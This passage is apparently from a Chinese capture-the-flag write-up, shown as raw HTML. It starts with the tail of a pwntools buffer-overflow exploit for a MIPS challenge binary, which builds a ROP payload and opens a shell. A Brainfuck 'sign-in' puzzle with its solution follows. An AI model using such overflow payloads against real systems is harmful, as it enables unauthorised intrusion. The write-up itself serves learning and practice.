operator\">=</span><span class=\"token string\">\"mips\"</span><span class=\"token punctuation\">)</span>\n\ncat<span class=\"token operator\">=</span><span class=\"token number\">0x0411010</span>\ngadget<span class=\"token operator\">=</span><span class=\"token number\">0x00400a20</span>\n\n<span class=\"token comment\">#p=\"A\"*(32+4*1)+p32(0x004009c8)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>gadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>cat<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x400b70</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>cat<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#pause()</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"签个到吧\"><a href=\"#签个到吧\" class=\"headerlink\" title=\"签个到吧\"></a>签个到吧</h3><pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">></span>+++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span></code></pre>\n\n<p>BrainFuck，但是观察到没有 <code>.</code> 来输出，在每部分后加上即可</p>\n<pre class=\"language-vbnet\" data-language=\"vbnet\"><code class=\"language-vbnet\"><span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token 